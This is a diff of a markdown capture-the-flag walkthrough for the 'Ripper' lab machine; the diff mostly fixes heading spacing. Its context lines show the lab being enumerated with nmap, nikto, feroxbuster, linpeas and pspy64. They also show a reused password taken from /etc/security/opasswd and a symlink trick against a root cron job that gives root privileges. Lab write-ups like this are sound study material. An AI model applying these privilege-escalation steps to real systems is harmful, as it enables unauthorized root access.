@@ -45,21 +45,21 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jul 13 09:22:10 2022 -- 1 IP address (1 host up) scanned in 10.88 seconds
  ```
-##Visiting the website 
+## Visiting the website 
 ```bash
  ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
 └─$ firefox $ip
 ```
 Nothing special found on the website/source code etc.
 
-##Nikto
+## Nikto
  ```bash
  ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
 └─$ nikto -h $url -C all -output nikto-test.html -Format HTML 
 ```
 Again nothing special
 
-##Feroxbuster
+## Feroxbuster
  ```bash
  ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
 └─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -t 500 -o ferox-$ip.log
@@ -138,7 +138,7 @@ permitted by applicable law.
 Last login: Wed Jul 13 08:59:44 2022 from 10.1.1.11
 jack@ripper:~$ 
  ```
- #Enumeration
+ # Enumeration
  Upload linpeas and pspy64
  ```bash
  ┌──(coolatos㉿CooLaToS)-[/opt/enumeration]
@@ -149,7 +149,7 @@ linpeas.sh  pspy64
  jack@ripper:/tmp$ chmod +x linpeas.sh 
 jack@ripper:/tmp$ ./linpeas.sh
  ```
-##Findings
+## Findings
 - user: helder
 - /etc/security/opasswd
 ```bash
@@ -163,12 +163,12 @@ helder@ripper:/tmp$
 ```
  The password is the same for both users
 
-##First Flag
+## First Flag
 ```bash
 helder@ripper:~$ls
 user.txt
 ```
-##More Enumeration
+## More Enumeration
  I tried again linpeas without but nothing special found
  Lets try pspy64
  ```bash
@@ -177,7 +177,7 @@ user.txt
  ```
 We can see that this is running every minute
 
-##Exploit
+## Exploit
  
  ```bash
  helder@ripper:/tmp$ln -s /root/.local/helder.txt /home/helder/passwd.txt
@@ -191,7 +191,7 @@ helder@ripper:/tmp$id
 uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
 helder@ripper:/tmp$cd /root/
 ```
-#Root Flag
+# Root Flag
 ```bash
 helder@ripper:/root$ls
 root.txt
